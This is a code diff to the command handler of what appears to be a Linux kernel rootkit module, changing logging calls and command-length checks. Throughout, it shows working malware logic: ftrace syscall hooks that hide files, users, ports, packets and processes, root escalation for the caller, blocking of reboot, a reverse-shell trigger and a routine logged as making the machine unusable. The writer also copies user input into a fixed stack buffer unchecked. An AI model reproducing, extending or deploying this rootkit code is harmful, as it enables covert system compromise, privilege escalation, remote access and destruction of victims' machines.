@@ -67,7 +67,7 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
 ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
 {
     if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
-        printk("Kernel -> userspace copy failed!\n");
+        pr_err("Kernel -> userspace copy failed!\n");
         return -1; // return error
     }
     return strlen(last_data); // return length of data that was copied
@@ -78,7 +78,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 {
     char tmpdata[DEVICE_SIZE + 1];
     if (copy_from_user(tmpdata, buff, count) != 0) {
-        printk("Userspace -> kernel copy failed!\n");
+        pr_err("Userspace -> kernel copy failed!\n");
         return -1;
     }
 
@@ -182,51 +182,51 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
 
     #ifdef PTREGS_SYSCALL_STUB
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
-        if(strlen(tmpdata) > strlen("hide-files")){
+        if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
+                pr_err("error hooking syscall %d\n", __NR_getdents64);
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+                pr_err("error hooking syscall %d\n", __NR_getdents);
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
-                printk(KERN_ERR "error hooking syscall openat\n");
+                pr_err("error hooking syscall openat\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
-                printk(KERN_ERR "error hooking syscall openat\n");
+                pr_err("error hooking syscall openat\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_statx") == 1){
-                printk(KERN_ERR "error hooking syscall statx\n");
+                pr_err("error hooking syscall statx\n");
             }
         }
     }
 
     if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
-        if(strlen(tmpdata) > strlen("hide-users")){
+        if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Usefrs: %s\n", last_data);
             print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
-                printk(KERN_ERR "error hooking syscall read\n");
+                pr_err("error hooking syscall read\n");
             }
         }
     }
 
     if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
-        if(strlen(tmpdata) > strlen("block-files-reboot")){
+        if(strlen(tmpdata) == strlen("block-files-reboot")){
             strcpy(last_data, tmpdata);
             pr_debug("Blocking Files & Reboot: %s\n", last_data);
             print_list(&exec_to_block);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+                pr_err("error hooking syscall %d\n", __NR_reboot);
             }
             if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 0){
                 insert_node(&exec_to_block, "shutdown");
                 if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
-                    printk(KERN_ERR "error hooking syscall execve\n");
+                    pr_err("error hooking syscall execve\n");
                 }
             }
             else{
@@ -236,50 +236,50 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
     #else
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
-        if(strlen(tmpdata) > strlen("hide-files")){
+        if(strlen(tmpdata) == strlen("hide-files")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Files: %s\n", last_data);
             print_list(&files_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
+                pr_err("error hooking syscall %d\n", __NR_getdents64);
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+                pr_err("error hooking syscall %d\n", __NR_getdents);
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
-                printk(KERN_ERR "error hooking syscall openat\n");
+                pr_err("error hooking syscall openat\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
-                printk(KERN_ERR "error hooking syscall openat\n");
+                pr_err("error hooking syscall openat\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
-                printk(KERN_ERR "error hooking syscall statx\n");
+                pr_err("error hooking syscall statx\n");
             }
         }
     }
 
     if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
-        if(strlen(tmpdata) > strlen("hide-users")){
+        if(strlen(tmpdata) == strlen("hide-users")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Users: %s\n", last_data);
             print_list(&users_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
-                printk(KERN_ERR "error hooking syscall read\n");
+                pr_err("error hooking syscall read\n");
             }
         }
     }
     if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
-        if(strlen(tmpdata) > strlen("block-files-reboot")){
+        if(strlen(tmpdata) == strlen("block-files-reboot")){
             strcpy(last_data, tmpdata);
             pr_debug("Blocking Files & Reboot: %s\n", last_data);
             print_list(&exec_to_block);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
-                printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
+                pr_err("error hooking syscall %d\n", __NR_reboot);
             }
             if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 0){
                 insert_node(&exec_to_block, "shutdown");
                 if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
-                    printk(KERN_ERR "error hooking syscall execve\n");
+                    pr_err("error hooking syscall execve\n");
                 }
             }
             else{
@@ -290,28 +290,28 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     #endif
 
     if(memcmp("hide-ports", tmpdata, strlen("hide-ports")) == 0){
-        if(strlen(tmpdata) > strlen("hide-ports")){
+        if(strlen(tmpdata) == strlen("hide-ports")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Ports: %s\n", last_data);
             print_list(&ports_to_hide);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
-                printk(KERN_ERR "error hooking tcp4_seq_show\n");
+                pr_err("error hooking tcp4_seq_show\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
-                printk(KERN_ERR "error hooking tcp6_seq_show\n");
+                pr_err("error hooking tcp6_seq_show\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
-                printk(KERN_ERR "error hooking udp4_seq_show\n");
+                pr_err("error hooking udp4_seq_show\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
-                printk(KERN_ERR "error hooking udp6_seq_show\n");
+                pr_err("error hooking udp6_seq_show\n");
             }
         }
     }
 
 
     if(memcmp("elevate", tmpdata, strlen("elevate")) == 0){
-        if(strlen(tmpdata) > strlen("elevate")){
+        if(strlen(tmpdata) == strlen("elevate")){
             strcpy(last_data, tmpdata);
             pr_debug("Setting root for calling process\n");
             set_root();
@@ -320,7 +320,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
     if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
-        if(strlen(tmpdata) > strlen("reverse-me")){
+        if(strlen(tmpdata) == strlen("reverse-me")){
             strcpy(last_data, tmpdata);
             pr_debug("Starting Reverse Shell: %s\n", last_data);
             print_list(&files_to_hide);
@@ -330,23 +330,23 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
     if(memcmp("hide-packets", tmpdata, strlen("hide-packets")) == 0){
-        if(strlen(tmpdata) > strlen("hide-packets")){
+        if(strlen(tmpdata) == strlen("hide-packets")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Packets\n");
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
-                printk(KERN_ERR "error hooking packet_rcv\n");
+                pr_err("error hooking packet_rcv\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
-                printk(KERN_ERR "error hooking tpacket_rcv\n");
+                pr_err("error hooking tpacket_rcv\n");
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
-                printk(KERN_ERR "error hooking packet_rcv_spkt\n");
+                pr_err("error hooking packet_rcv_spkt\n");
             }
         }
     }
 
     if(memcmp("hide-process", tmpdata, strlen("hide-process")) == 0){
-        if(strlen(tmpdata) > strlen("hide-process")){
+        if(strlen(tmpdata) == strlen("hide-process")){
             strcpy(last_data, tmpdata);
             pr_debug("Hiding Processes");
             switch_hide_process();
@@ -354,7 +354,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
     
     if(memcmp("rooted", tmpdata, strlen("rooted")) == 0){
-        if(strlen(tmpdata) > strlen("rooted")){
+        if(strlen(tmpdata) == strlen("rooted")){
             strcpy(last_data, tmpdata);
             pr_debug("Rooting Forever\n");
             rooted();
@@ -364,7 +364,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
     if(memcmp("block-packets", tmpdata, strlen("block-packets")) == 0){
-        if(strlen(tmpdata) > strlen("block-packets\n")){
+        if(strlen(tmpdata) == strlen("block-packets\n")){
             strcpy(last_data, tmpdata);
             pr_debug("Blocking Packets");
             switch_net_hook();
@@ -372,7 +372,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
     
     if(memcmp("finito", tmpdata, strlen("finito")) == 0){
-        if(strlen(tmpdata) > strlen("finito")){
+        if(strlen(tmpdata) == strlen("finito")){
             strcpy(last_data, tmpdata);
             pr_debug("Machine Will Be Unusable\n");
             start_bombing_run();
